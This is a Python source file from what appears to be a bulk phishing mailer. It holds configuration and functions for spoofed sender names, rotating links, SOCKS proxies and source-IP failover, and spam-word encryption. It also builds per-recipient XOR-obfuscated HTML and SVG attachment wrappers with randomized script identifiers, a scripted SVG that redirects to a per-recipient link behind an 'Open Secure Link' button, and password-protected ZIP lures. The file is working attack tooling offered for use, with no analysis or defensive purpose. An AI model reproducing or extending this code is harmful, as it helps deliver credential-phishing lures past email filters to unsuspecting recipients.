    'enableEncryption': 0,
    'technique': 2,
    'selection_system': 1
}

proxy_setup = {
    'enable': 0,
    'ip': '',
    'port': '',
    'user': '',
    'password': '',
    'enableMultiple': 0,
    'proxiesList': 'Multiple/Proxies.txt'
}

# FromMail / FromName / Link / QR / ReplyTo setups
frommail_setup = {
    'hideFromMail': 0,
    'enableMultiple': 0,
    'frommailList': 'Multiple/Frommails.txt',
    'selection_system': 1
}

fromname_setup = {
    'fromName': '',
    'enableMultiple': 0,
    'fromnameList': 'Multiple/Fromnames.txt',
    'selection_system': 1
}

link_setup = {
    'link': '',
    'limit': -1,
    'enableMultiple': 0,
    'linkList': 'Link/link.txt',
    'selection_system': 1
}

qrcode_setup = {
    'enable': 0,
    'qrlink': 'https://www.google.com/{EMAIL64}',
    'shape': 1,
    'qrSize': 5,
    'shapeColor': '',
    'backgroundColor': '',
    'margin': 4,
    'customIcon': 0,
    'iconLocation': '',
    'iconShape': 1,
    'iconBackgroundColor': '',
    'hideQrCode': 0,
}

logo_setup = {
    'enable': 0,
    'location': 'LOGO/microsoft.png',
}

replyTo_setup = {
    'replyTo': 'Default',
    'replyToName': ''
}

# Rotating lists for frommail/fromname/link
frommail_list = []
frommail_index = 0
fromname_list = []
fromname_index = 0
link_entries = []  # list of dicts: {'url':..., 'limit': int, 'used': int}
link_index = 0
link_lock = threading.Lock()

disclaimer_setup = {
    'enable': 0,
    'location': 'DISCLAIMER/confidential.txt',
    'enableMultiple': 0,
    'multipleLocation': 'DISCLAIMER',
}
disclaimer_files = []
disclaimer_index = 0
disclaimer_lock = threading.Lock()

# Letter rotation support
letter_list = []
letter_index = 0
letter_lock = threading.Lock()

sender_setup = {
    'multithread': 1,
    'numberOfThreads': 5,
    'sleepEnable': 0,
    'sleepTime': 0,
    'logoEnable': 0,
    'localhostNameEnable': 0,
    'localhostName': '',
    'messageType': '1',
    'emailSensitivity': '0',
    'emailPriority': '1',
    'imageBypass': 1
}

pdf_setup = {
    'enable': 0,
    'location': 'Pdf/Pdf.html',
    'name': 'attachPdf.pdf',
    'layout': 1,
    'page_type': 1,
    'margin': 0.4,
    'password_protection': 0,
    'password': '',
    'zip_it': 0,
}

svg_setup = {
    'enable': 0,
    'location': 'Svg/Svg.html',
    'name': 'attachSvg.svg'
}

doc_setup = {
    'enable': 0,
    'location': 'Doc/Doc.html',
    'name': 'attachDoc.doc'
}

docx_setup = {
    'enable': 0,
    'location': 'Docx/Docx.html',
    'name': 'attachDocx.docx'
}

rtf_setup = {
    'enable': 0,
    'location': 'RTF/rtf.html',
    'name': 'inspect.rtf',
    'zip_it': 0,
}

pptx_setup = {
    'enable': 0,
    'location': 'PPTX/pptx.html',
    'name': 'presentation.pptx',
    'zip_it': 0,
}

icalendar_setup = {
    'enable': 0,
    'summary': 'Team Meeting',
    'description': 'Discuss project updates and next steps.',
    'location': 'Conference Room 101',
    'starts': '2025-06-05T09:00:00',
    'ends': '2025-06-05T10:00:00',
    'organizer_name': 'John Doe',
    'organizer_email': 'john.doe@example.com',
    'attendee_name': 'Jane Smith',
    'attendee_email': 'jane.smith@example.com',
    'name': 'meeting.ics',
}

eml_setup = {
    'enable': 0,
    'location': 'Eml/Eml.html',
    'name': 'Secure.eml',
    'subject': 'Message File',
    'from': 'Account@account.com',
    'from_name': 'Secure Message',
    'to': '{EMAIL}',
    'to_name': '{username}',
    'emlAttachment': 0,
    'onlyEml': 0,
    'attachments': [],
}

local_files_setup = {
    'enable': 0,
    'location': 'MULTIPLE/local_files.txt',
    'selection': 1,
}
local_file_entries = []
local_file_index = 0
local_file_lock = threading.Lock()

zip_setup = {
    'enable': 0,
    'password_protection': 0,
    'password': 'zip123',
    'name': 'archive.zip',
    'zip_all': 1,
}

otherfile_setup = {
    'enable': 0,
    'location': 'Otherfile/myfile.txt',
    'name': 'Data.txt'
}

htmlimage_setup = {
    'enable': 0,
    'location': 'Htmlimg/Image.html',
    'name': 'attachHtmlImage.png',
    'width': 660,
    'height': 669,
    'enableClip': 0,
    'clipLeft': 1,
    'clipTop': 1,
    'clipWidth': 1024,
    'clipHeight': 768,
    'scale': 2.0,
    'displayWidth': 600,
    'displayHeight': 0,
    'resolutionX': 100,
    'resolutionY': 100,
    'imageUrl': '',
    'showSample': 0,
    'sampleEmail': '',
    'sampleFocus': 1,
    'sampleFocusPadding': 24,
    'sampleHandles': 0,
    'enableMultiple': 0,
    'multipleLocation': 'HTML_IMAGE/image1.html',
    'imgletterList': 'Multiple/Htmlimgs.txt'
}

htmlAttachment_setup = {
    'enable': 0,
    'location': 'HTMLAttachment/attachment.html',
    'name': 'Attach.html',
    'encrypt': 0,
    'enableMultiple': 0,
    'htmlList': 'Multiple/Htmlattach.txt',
    'attachAll': 0,
    'zip_it': 0,
}

html_attachment_list = []
html_attachment_index = 0

svgAttachment_setup = {
    'enable': 0,
    'name': 'ATT0{number3}.svg',
    'encrypt': 1,
    'enableMultiple': 0,
    'svgList': 'Multiple/Svgattach.txt',
    'attachAll': 0,
    'zip_it': 0,
}

svg_attachment_list = []
svg_attachment_index = 0
# link_svg_setup (v4.4): parsed from link_svg_config
link_svg_setup = {'enable': 0, 'link': '', 'name': 'ATT0{NUMBER6}{USERNAME}.svg', 'zip_it': 0}

attachment_rotate_index = 0

spamWordEncryption = {
    'enable': 0,
    'spamList': 'Multiple/SpamList.txt',
    'technique': 2
}


def get_next_bind_ip():
    global ip_index, rotate_ip, local_ips
    if not rotate_ip or not local_ips:
        return None
    with ip_rotation_lock:
        bind_ip = local_ips[ip_index % len(local_ips)]
        ip_index += 1
    return bind_ip


# v8.7: bounded source-IP failover for campaign sends. When the selected bind
# IP cannot reach the SMTP host (connection timeout / refused / unreachable,
# e.g. WinError 10060), retry the same message through the other configured
# source IPs before declaring the lead failed. This stops a single dead or
# routed-unusable entry in localiplist from blocking campaign delivery.
BIND_IP_FAILOVER_MAX_ATTEMPTS = 4


def _is_connection_class_error(error):
    """True when an SMTP exception looks like a network/connection failure
    (as opposed to an application-level rejection such as a 5xx status or
    authentication failure), which is the only class retried through a
    different source IP."""
    text = str(error or '').lower()
    if not text:
        return False
    markers = (
        '10060', '10061', '10054', '10051', '10065', '10053',
        'timed out', 'timeout', 'did not properly respond', 'failed to respond',
        'connection refused', 'connection reset', 'connection attempt failed',
        'connection aborted', 'network is unreachable', 'no route to host',
        'host is down', 'connection error', 'getaddrinfo',
    )
    return any(marker in text for marker in markers)


def _bind_ip_failover_candidates(primary_bind_ip, limit=BIND_IP_FAILOVER_MAX_ATTEMPTS):
    """Ordered list of alternative source IPs to try after primary_bind_ip
    fails. The primary is excluded (it was already attempted). Returns an empty
    list when source-IP rotation is disabled or there are no usable
    alternatives."""
    try:
        pool = list(local_ips or [])
    except Exception:
        pool = []
    primary = str(primary_bind_ip).strip() if primary_bind_ip else ''
    candidates = []
    seen = set()
    if primary:
        seen.add(primary)
    for raw in pool:
        ip = str(raw).strip()
        if not ip or ip in seen:
            continue
        seen.add(ip)
        candidates.append(ip)
        if len(candidates) >= max(0, int(limit)):
            break
    return candidates


def load_disclaimer_files():
    global disclaimer_files, disclaimer_index
    folder = str(disclaimer_setup.get('multipleLocation') or 'DISCLAIMER').strip()
    files = []
    try:
        if os.path.isdir(folder):
            files = [
                os.path.join(folder, name)
                for name in sorted(os.listdir(folder))
                if name.lower().endswith('.txt') and os.path.isfile(os.path.join(folder, name))
            ]
    except Exception:
        files = []
    with disclaimer_lock:
        disclaimer_files = files
        disclaimer_index = 0


def get_next_disclaimer():
    global disclaimer_index
    if int(disclaimer_setup.get('enable', 0)) != 1:
        return ''
    if int(disclaimer_setup.get('enableMultiple', 0)) == 1:
        if not disclaimer_files:
            load_disclaimer_files()
        with disclaimer_lock:
            if not disclaimer_files:
                return ''
            path = disclaimer_files[disclaimer_index % len(disclaimer_files)]
            disclaimer_index += 1
    else:
        path = str(disclaimer_setup.get('location') or '').strip()
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as disclaimer_file:
            return disclaimer_file.read().strip()
    except Exception:
        return ''


# --- SOCKS5 proxy pool (proxies_config / proxy_setup) ---
proxy_list = []
proxy_index = 0
proxy_lock = threading.Lock()


def parse_proxy_entry(line):
    """Parse one Proxies.txt entry.

    Accepted formats (per line, '#' comments and blank lines ignored):
        login:password|host:port
        :|host:port            (no authentication)
        host:port
    Returns a dict {'host', 'port', 'user', 'password'} or None when invalid.
    """
    entry = str(line or '').strip()
    if not entry or entry.startswith('#'):
        return None
    if '|' in entry:
        auth_part, addr_part = entry.split('|', 1)
    else:
        auth_part = ''
        addr_part = entry
    addr_part = addr_part.strip()
    if not addr_part or addr_part.count(':') != 1:
        # Reject IPv6 literals / malformed host:port entries.
        return None
    host, port = addr_part.rsplit(':', 1)
    host = host.strip()
    if not host or not port.isdigit():
        return None
    proxy_port = int(port)
    if not (0 < proxy_port < 65536):
        return None
    user = ''
    password = ''
    if auth_part:
        auth = auth_part.strip()
        if ':' in auth:
            user, password = auth.split(':', 1)
        else:
            user = auth
    return {'host': host, 'port': proxy_port, 'user': user.strip(), 'password': password.strip()}


def load_proxy_pool():
    """(Re)load the proxy pool from the configured MULTIPLE/Proxies.txt list."""
    global proxy_list, proxy_index
    new_pool = []
    pool_path = proxy_setup.get('proxiesList', 'MULTIPLE/Proxies.txt')
    try:
        if os.path.isfile(pool_path):
            with open(pool_path, 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh:
                    parsed = parse_proxy_entry(line)
                    if parsed:
                        new_pool.append(parsed)
    except Exception:
        new_pool = []
    with proxy_lock:
        proxy_list = new_pool
        proxy_index = 0
    if proxy_setup.get('enable', 0) == 1:
        if not new_pool:
            print(f"{Fore.YELLOW}[WARN] SOCKS5 proxy enabled but {pool_path} has no usable proxy entries. Run python3 pip.py to install PySocks and add proxies in the format host:port or user:password|host:port.{Style.RESET_ALL}")
        elif proxy_setup.get('enableMultiple', 0) != 1:
            print(f"{Fore.YELLOW}[WARN] SOCKS5 proxy enabled in single mode: using ip/port/user/password from setup.ini (MULTIPLE proxy list ignored).{Style.RESET_ALL}")
    return proxy_list


def get_next_proxy():
    """Return the next proxy dict for the current recipient.

    Precedence: when enableMultiple is on, rotate through the pool loaded
    from MULTIPLE/Proxies.txt; otherwise use the single ip/port/user/password
    from the proxies_config section. Returns None when disabled/misconfigured.
    """
    global proxy_index
    if proxy_setup.get('enable', 0) != 1:
        return None
    if proxy_setup.get('enableMultiple', 0) == 1:
        if not proxy_list:
            load_proxy_pool()
        if not proxy_list:
            return None
        with proxy_lock:
            proxy = proxy_list[proxy_index % len(proxy_list)]
            proxy_index += 1
        return dict(proxy)
    host = str(proxy_setup.get('ip', '') or '').strip()
    port_raw = str(proxy_setup.get('port', '') or '').strip()
    if not host or not port_raw.isdigit():
        return None
    return {
        'host': host,
        'port': int(port_raw),
        'user': str(proxy_setup.get('user', '') or '').strip(),
        'password': str(proxy_setup.get('password', '') or '').strip(),
    }


def load_html_attachment_list(path):
    try:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8') as fh:
                return [line.strip() for line in fh if line.strip()]
    except Exception:
        pass
    return []


def _personalized_key(recipient_email, min_len=14, max_len=30):
    """Deterministic per-recipient key (14-30 chars from [A-Za-z0-9]).

    Key = sha256('vdmonk-v3::' + lowercased recipient email) driven through an
    LCG over the alnum alphabet, so the same recipient always maps to the same
    key while different recipients always receive different encrypted bytes
    for the same attachment.
    """
    seed = 'vdmonk-v3::' + str(recipient_email or '').strip().lower()
    digest = hashlib.sha256(seed.encode('utf-8')).hexdigest()
    alphabet = string.ascii_letters + string.digits
    length = min_len + (int(digest[:8], 16) % (max_len - min_len + 1))
    state = int(digest, 16) & 0xFFFFFFFF
    out = []
    for _ in range(length):
        state = (state * 1664525 + 1013904223) & 0xFFFFFFFF
        out.append(alphabet[state % len(alphabet)])
    return ''.join(out)


def _random_ident(prefix='d', size=None):
    """Random JS-safe identifier with the given prefix (unique per call)."""
    import secrets as _secrets
    import string as _string
    if size is None:
        size = _secrets.randbelow(7) + 5   # 5..11
    first = _string.ascii_letters + '_'
    rest = _string.ascii_letters + _string.digits + '_'
    ident = prefix
    if not ident:
        ident = _secrets.choice(first)
    return ident + ''.join(_secrets.choice(rest) for _ in range(size))


def _xor_obfuscate_bytes(plain_text, key):
    raw = plain_text.encode('utf-8')
    if not key:
        return raw
    return bytes(byte ^ ord(key[i % len(key)]) for i, byte in enumerate(raw))


def _key_dimensions(key, min_w=400, max_w=800, min_h=80, max_h=200):
    acc = sum(ord(ch) for ch in key or 'k')
    width = min_w + (acc % (max_w - min_w + 1))
    height = min_h + ((acc >> 3) % (max_h - min_h + 1))
    return width, height


def _random_title():
    """Random numeric suffix so wrapper titles differ per recipient."""
    import secrets as _secrets
    return 'Secure Message ' + str(_secrets.randbelow(900000) + 100000)


def build_personalized_html_wrapper(html_text, recipient_email):
    """Personalized per-recipient obfuscation of an HTML attachment.

    Unlike the old static wrapper (identical bytes for every recipient), the
    XOR key is derived from the recipient address, the payload is base64-
    encoded and random JS identifiers/title are injected, so every recipient
    receives different attachment bytes even when the plaintext is identical.
    """
    key = _personalized_key(recipient_email)
    obfuscated = _xor_obfuscate_bytes(html_text, key)
    encoded = base64.b64encode(obfuscated).decode('ascii')
    fn = _random_ident('d')
    vk = _random_ident('k', 3)   # key variable
    vb = _random_ident('b', 3)   # base64 var
    vr = _random_ident('r', 3)   # raw bytes var
    vu = _random_ident('u', 3)   # uint8 array var
    vi = _random_ident('i', 2)   # loop var
    vt = _random_ident('t', 3)   # TextDecoder var
    title = _random_title()
    return (
        '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>__TITLE__</title>'
        '<script>function __FN__(){'
        'var __K__="__KEY__";'
        'var __B__="__B64__";'
        'var __R__=atob(__B__);'
        'var __U__=new Uint8Array(__R__.length);'
        'for(var __I__=0;__I__<__R__.length;__I__++){'
        '__U__[__I__]=__R__.charCodeAt(__I__)^__K__.charCodeAt(__I__%__K__.length);}'
        'var __T__=new TextDecoder("utf-8");'
        'document.open();document.write(__T__.decode(__U__));document.close();}'
        '</script></head><body onload="__FN__()"></body></html>'
    ).replace('__TITLE__', title).replace('__FN__', fn).replace('__K__', vk).replace('__KEY__', key).replace('__B__', vb).replace('__B64__', encoded).replace('__R__', vr).replace('__U__', vu).replace('__I__', vi).replace('__T__', vt)


def build_personalized_svg_wrapper(svg_text, recipient_email):
    """Personalized per-recipient obfuscation of an SVG attachment.

    Keeps the original runtime semantics (DOMParser / importNode executed
    directly at SVG load) while the key is derived from the recipient so every
    recipient gets unique attachment bytes; the container width and height are
    derived deterministically from the key.
    """
    key = _personalized_key(recipient_email)
    obfuscated = _xor_obfuscate_bytes(svg_text, key)
    encoded = base64.b64encode(obfuscated).decode('ascii')
    width, height = _key_dimensions(key)
    vs = _random_ident('s', 3)   # payload var
    vk = _random_ident('k', 3)   # key var
    vr = _random_ident('r', 3)   # raw bytes var
    vu = _random_ident('u', 3)   # uint8 array var
    vi = _random_ident('i', 2)   # loop var
    vp = _random_ident('p', 3)   # DOMParser var
    vc = _random_ident('c', 3)   # parsed document var
    vm = _random_ident('m', 3)   # imported node var
    vx = _random_ident('x', 3)   # root node var
    template = (
        '<?xml version="1.0"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="__W__" height="__H__" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">\n'
        '<script type="text/javascript"><![CDATA[\n'
        'var __S__="__B64__";\n'
        'var __K__="__KEY__";\n'
        'var __R__=atob(__S__);\n'
        'var __U__=new Uint8Array(__R__.length);\n'
        'for(var __I__=0;__I__<__R__.length;__I__++){__U__[__I__]=__R__.charCodeAt(__I__)^__K__.charCodeAt(__I__%__K__.length);}\n'
        'var __P__=new DOMParser();\n'
        'var __C__=__P__.parseFromString(new TextDecoder("utf-8").decode(__U__),"image/svg+xml");\n'
        'var __M__=document.importNode(__C__.documentElement,true);\n'
        'var __X__=document.documentElement;\n'
        'while(__X__.firstChild){__X__.removeChild(__X__.firstChild);}\n'
        '__X__.appendChild(__M__);\n'
        ']]></script></svg>'
    )
    return (template.replace('__W__', str(width)).replace('__H__', str(height))
            .replace('__S__', vs).replace('__KEY__', key).replace('__B64__', encoded)
            .replace('__R__', vr).replace('__U__', vu).replace('__I__', vi)
            .replace('__K__', vk).replace('__P__', vp).replace('__C__', vc)
            .replace('__M__', vm).replace('__X__', vx))


def load_link_svg_from_config(cfgparser):
    """Read link_svg section into link_svg_setup (v4.4)."""
    try:
        if not cfgparser.has_section('link_svg'):
            return
        link_svg_setup['enable'] = 1 if str(cfgparser.get('link_svg', 'enable', fallback='0')).strip().lower() in ('1', 'true', 'yes', 'on') else 0
        link_svg_setup['link'] = str(cfgparser.get('link_svg', 'link', fallback='{link}') or '').strip()
        link_svg_setup['name'] = str(cfgparser.get('link_svg', 'name', fallback='ATT0{NUMBER6}{USERNAME}.svg') or '').strip()
        link_svg_setup['zip_it'] = 1 if str(cfgparser.get('link_svg', 'zip_it', fallback='0')).strip().lower() in ('1', 'true', 'yes', 'on') else 0
        if link_svg_setup['enable']:
            print("[LINK-SVG] Link-to-SVG attachment enabled (zip_it=" + str(link_svg_setup['zip_it']) + ")")
    except Exception as e:
        print("[LINK-SVG] config warning: " + str(e))


def _zipcrypto_crc_byte(crc, value):
    crc ^= value
    for _ in range(8):
        crc = (crc >> 1) ^ 0xedb88320 if crc & 1 else crc >> 1
    return crc & 0xffffffff


def _zipcrypto_update_keys(keys, value):
    keys[0] = _zipcrypto_crc_byte(keys[0], value)
    keys[1] = ((keys[1] + (keys[0] & 0xff)) * 134775813 + 1) & 0xffffffff
    keys[2] = _zipcrypto_crc_byte(keys[2], keys[1] >> 24)


def _zipcrypto_encrypt(data, password):
    keys = [0x12345678, 0x23456789, 0x34567890]
    password_bytes = password.encode('utf-8') if isinstance(password, str) else bytes(password)
    for value in password_bytes:
        _zipcrypto_update_keys(keys, value)

    encrypted = bytearray()
    for value in data:
        key = ((keys[2] | 2) * ((keys[2] | 2) ^ 1) >> 8) & 0xff
        encrypted.append(value ^ key)
        _zipcrypto_update_keys(keys, value)
    return bytes(encrypted)


def _create_windows_compatible_zip(filename, content, password):
    """Create a legacy ZipCrypto archive readable by Windows Explorer."""
    from io import BytesIO
    import os
    import struct
    import zipfile

    content_data = content if isinstance(content, bytes) else str(content).encode('utf-8')
    plain = BytesIO()
    with zipfile.ZipFile(plain, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(filename, content_data)
    archive_data = bytearray(plain.getvalue())

    local_offset = archive_data.find(b'PK\x03\x04')
    central_offset = archive_data.find(b'PK\x01\x02')
    if local_offset < 0 or central_offset < 0:
        raise RuntimeError('Could not locate ZIP headers')

    local_name_length, local_extra_length = struct.unpack_from('<HH', archive_data, local_offset + 26)
    payload_offset = local_offset + 30 + local_name_length + local_extra_length
    compressed_size = struct.unpack_from('<I', archive_data, local_offset + 18)[0]
    payload_end = payload_offset + compressed_size
    crc = struct.unpack_from('<I', archive_data, local_offset + 14)[0]

    header = os.urandom(11) + bytes((crc >> 24,))
    encrypted_payload = _zipcrypto_encrypt(header + bytes(archive_data[payload_offset:payload_end]), password)
    archive_data[local_offset + 6:local_offset + 8] = struct.pack('<H', 0x0001)
    archive_data[local_offset + 18:local_offset + 22] = struct.pack('<I', len(encrypted_payload))
    archive_data = archive_data[:payload_offset] + encrypted_payload + archive_data[payload_end:]

    central_shift = len(encrypted_payload) - compressed_size
    central_offset += central_shift
    archive_data[central_offset + 8:central_offset + 10] = struct.pack('<H', 0x0001)
    archive_data[central_offset + 20:central_offset + 24] = struct.pack('<I', len(encrypted_payload))
    end_offset = archive_data.rfind(b'PK\x05\x06')
    if end_offset < 0:
        raise RuntimeError('Could not locate ZIP end record')
    archive_data[end_offset + 16:end_offset + 20] = struct.pack('<I', central_offset)
    return bytes(archive_data)


def create_password_protected_zip(filename, content, password=None):
    """Create password-protected ZIP file.

    Uses legacy ZipCrypto for compatibility with Windows File Explorer, then
    tries 7-Zip if the pure-Python writer fails.

    Password-protected output never falls back to an unencrypted archive.
    """
    from io import BytesIO
    import os as os_module
    import subprocess
    import tempfile

    should_encrypt = bool(password)

    if should_encrypt:
        try:
            zip_data = _create_windows_compatible_zip(filename, content, password)
            print(f"[ZIP] Created Windows-compatible password-protected ZIP: {filename}")
            return zip_data
        except Exception as e:
            print(f"[ZIP] ZipCrypto method failed: {e}")
        try:
            import pyzipper
            content_data = content if isinstance(content, bytes) else str(content).encode('utf-8')
            buf = BytesIO()
            with pyzipper.AESZipFile(buf, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as archive:
                archive.setpassword(str(password).encode('utf-8'))
                archive.writestr(filename, content_data)
            print(f"[ZIP] Created AES password-protected ZIP: {filename}")
            return buf.getvalue()
        except Exception as e:
            print(f"[ZIP] pyzipper AES method failed: {e}")

    # Try 7-Zip command line (Windows/Linux/Mac)
    if should_encrypt:
        try:
            # Check if 7z is available
            result = subprocess.run(['7z', '-?'], capture_output=True, timeout=2)
            if result.returncode in (0, 1):  # 7z returns 1 for help
                # 7-Zip is available, use it
                with tempfile.TemporaryDirectory() as tmpdir:
                    # Write content to temporary file
                    tmp_file = os_module.path.join(tmpdir, filename)
                    with open(tmp_file, 'wb') as f:
                        f.write(content if isinstance(content, bytes) else str(content).encode('utf-8'))
                    
                    # Create password-protected ZIP with 7-Zip
                    zip_file = os_module.path.join(tmpdir, 'archive.zip')
                    cmd = ['7z', 'a', '-p' + password, zip_file, tmp_file]
                    result = subprocess.run(cmd, capture_output=True, timeout=10)
                    
                    if result.returncode == 0:
                        with open(zip_file, 'rb') as f:
                            zip_data = f.read()
                        print(f"[ZIP] Created password-protected ZIP using 7-Zip: {filename}")
                        return zip_data
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception) as e:
            print(f"[ZIP] 7-Zip method failed: {e}")

    if should_encrypt:
        raise RuntimeError(
            "Password-protected ZIP creation requires pyzipper or 7-Zip. "
            "Install pyzipper with: python -m pip install pyzipper"
        )

    # Create an unencrypted ZIP only when encryption was not requested.
    try:
        from io import BytesIO
        import zipfile
        content_data = content if isinstance(content, bytes) else str(content).encode('utf-8')
        buf = BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(filename, content_data, compress_type=zipfile.ZIP_DEFLATED)

        print(f"[ZIP] Created unencrypted ZIP: {filename}")
        return buf.getvalue()
    except Exception as e:
        print(f"[ZIP] Fatal error creating ZIP: {e}")
        return b""


def attach_link_svg_attachment(msg, recipient_email, link_url):
    """Link-to-SVG attachment (v4.4): scripted redirect SVG bound to the recipient URL."""
    try:
        if link_svg_setup.get('enable', 0) != 1:
            return False
        cfg_link = str(link_svg_setup.get('link') or '').strip()
        if not cfg_link or '{link}' in cfg_link.lower() or '[link]' in cfg_link.lower():
            target_url = str(link_url or '').strip()
        else:
            try:
                target_url = findString(recipient_email, cfg_link, skip_link=False)
            except Exception:
                target_url = cfg_link
        if not target_url:
            print("[LINK-SVG] No URL available for recipient, skipping")
            return False
        q = chr(39)
        tpl = []
        a = tpl.append
        a('<?xml version="1.0" encoding="UTF-8"?>')
        a('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1200 800">')
        a('<script type="text/javascript"><![CDATA[')
        a('try { window.location.href = SURL; } catch (e) {}')
        a('try { window.top.location.href = SURL; } catch (e) {}')
        a(']]></script>')
        a('<a xlink:href=SURL href=SURL target="_top">')
        a('<rect width="1200" height="800" fill="#ffffff"/>')
        a('<rect x="440" y="330" width="320" height="120" rx="18" fill="#0b57d0"/>')
        a('<text x="600" y="404" text-anchor="middle" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="#ffffff">Open Secure Link</text>')
        a('</a>')
        a('</svg>')
        svg_text = chr(10).join(tpl).replace('SURL', q + target_url + q)
        try:
            svg_text = findString(recipient_email, svg_text, skip_link=True)
        except Exception:
            pass
        raw_name = link_svg_setup.get('name') or 'ATT0{NUMBER6}{USERNAME}.svg'
        try:
            filename = findString(recipient_email, raw_name)
        except Exception:
            filename = raw_name
        try:
            username = str(recipient_email).split('@')[0]
            filename = filename.replace('{NUMBER6}', RandomNumber(6)).replace('{USERNAME}', username)
            filename = filename.replace('{number6}', RandomNumber(6)).replace('{username}', username)
        except Exception:
            pass
        file_bytes = svg_text.encode('utf-8')
        if link_svg_setup.get('zip_it', 0) == 1:
            # Use password-protected ZIP if configured
            password = zip_setup.get('password') if zip_setup.get('password_protection', 0) == 1 else None
            file_bytes = create_password_protected_zip(filename, svg_text, password)
            zip_name = os.path.splitext(filename)[0] + '.zip'
            part = MIMEBase('application', 'zip')
            part.set_payload(file_bytes)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment', filename=(Header(zip_name, 'utf-8').encode()))
            msg.attach(part)
            if zip_setup.get('password_protection', 0) == 1:
                print("[ATTACHMENT] Attached Link-SVG zip (password-protected): " + zip_name)
            else:
                print("[ATTACHMENT] Attached Link-SVG zip: " + zip_name)
        else:
            part = MIMEBase('image', 'svg+xml')
            part.set_payload(file_bytes)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'inline', filename=(Header(filename, 'utf-8').encode()))
            msg.attach(part)
            print("[ATTACHMENT] Attached Link-SVG: " + filename)
        return True
    except Exception as e:
        print("[LINK-SVG] attach error: " + str(e))
    return False


def attach_html_attachment(msg, recipient_email, link_url=None, link_urls=None):
    global html_attachment_list, html_attachment_index
    if htmlAttachment_setup.get('enable', 0) != 1:
        print(f"{Fore.YELLOW}[TRACE] htmlAttachment disabled, skipping HTML attachment{Style.RESET_ALL}")
        return False

    files_to_attach = []
    if htmlAttachment_setup.get('enableMultiple', 0) == 1 and html_attachment_list:
        if htmlAttachment_setup.get('attachAll', 0) == 1:
            files_to_attach = html_attachment_list[:]
        else:
            fpath = html_attachment_list[html_attachment_index % len(html_attachment_list)]
            html_attachment_index += 1
            files_to_attach = [fpath]
    else:
        if htmlAttachment_setup.get('location'):
            files_to_attach = [htmlAttachment_setup.get('location')]

    attached = False
    for filepath in files_to_attach:
        if filepath:
            if not os.path.isabs(filepath) and not os.path.isfile(filepath):
                filepath = os.path.join(os.path.dirname(os.path.abspath(__file__)), filepath)
            if os.path.isfile(filepath):
                try:
                    file_bytes = None
                    is_text_attachment = filepath.lower().endswith(('.html', '.htm', '.txt', '.xml', '.svg', '.js', '.json'))
                    if is_text_attachment:
                        try:
                            with open(filepath, 'r', encoding='utf-8') as fh:
                                text = fh.read()
                            text = _normalize_encoded_tokens(text)
                            # Support both {placeholder} and ${placeholder} styles
                            text = re.sub(r"\$\{([^}]+)\}", r"{\1}", text)
                            text = findString(recipient_email, text, skip_link=link_url is not None)
                            if link_url is not None:
                                links = link_urls if link_urls is not None else {1: link_url}
                                links.setdefault(1, link_url)
                                text = _replace_link_placeholders(text, recipient_email, links)
                            # {logo}/{logos}: recipient-domain / random local logos rendered as
                            # inline data URIs (attached files cannot reference cid: parts of the
                            # outer message).
                            try:
                                qr_tokens = ('{qrcode}', '{QRCODE}')
                                if any(token in text for token in qr_tokens):
                                    qr_uri = None
                                    if qrcode_setup.get('enable', 0):
                                        qr_data = _resolve_qr_data(link_url or (link_urls or {}).get(1) or '', recipient_email)
                                        if qr_data:
                                            qr_bytes = generate_qr_code_image(qr_data)
                                            qr_uri = 'data:image/png;base64,' + base64.b64encode(qr_bytes).decode('ascii')
                                    replacement = _render_qr_html(
                                        qr_uri,
                                        link_url,
                                        bool(qrcode_setup.get('hideQrCode', 0)),
                                    ) if qr_uri else ''
                                    for token in qr_tokens:
                                        if qr_uri:
                                            text = text.replace('src="' + token + '"', 'src="' + qr_uri + '"')
                                            text = text.replace("src='" + token + "'", 'src="' + qr_uri + '"')
                                        text = text.replace(token, replacement)
                                if '{logo}' in text:
                                    try:
                                        logo_path = get_logo_for_email(recipient_email)
                                    except Exception:
                                        logo_path = None
                                    if not logo_path:
                                        try:
                                            logo_path = _get_logo_fallback_path()
                                        except Exception:
                                            logo_path = None
                                    logo_uri = image_to_data_uri(logo_path) if logo_path else None
                                    if logo_uri:
                                        text = text.replace('{logo}', '<img src="' + logo_uri + '" alt="logo" />')
                                    else:
                                        text = text.replace('{logo}', '')
                                if '{logos}' in text:
                                    try:
                                        logo_path = get_logo_for_company(_functions.get_current_company_email())
                                        if not logo_path:
                                            logo_path = get_random_logo()
                                    except Exception:
                                        logo_path = None
                                    logo_uri = image_to_data_uri(logo_path) if logo_path else None
                                    if logo_uri:
                                        text = text.replace('{logos}', '<img src="' + logo_uri + '" alt="logo" />')
                                    else:
                                        text = text.replace('{logos}', '')
                            except Exception:
                                pass
                            if htmlAttachment_setup.get('encrypt', 0) == 1:
                                text = build_personalized_html_wrapper(text, recipient_email)
                            file_bytes = text.encode('utf-8')
                        except Exception:
                            file_bytes = None
                    if file_bytes is None:
                        with open(filepath, 'rb') as fh:
                            file_bytes = fh.read()

                    raw_name = htmlAttachment_setup.get('name') if len(files_to_attach) == 1 else os.path.basename(filepath)
                    filename = findString(recipient_email, raw_name)
                    if len(files_to_attach) > 1:
                        name_root, name_ext = os.path.splitext(filename)
                        filename = f"{name_root}_{html_attachment_index}{name_ext}"

                    # Keep HTML as text/html while marking it as a real attachment so clients
                    # list it instead of rendering it silently as part of the message body.
                    if htmlAttachment_setup.get('zip_it', 0) == 1:
                        # Use password-protected ZIP if configured
                        password = zip_setup.get('password') if zip_setup.get('password_protection', 0) == 1 else None
                        zip_data = create_password_protected_zip(filename, file_bytes, password)
                        zip_name = os.path.splitext(filename)[0] + '.zip'
                        part = MIMEBase('application', 'zip')
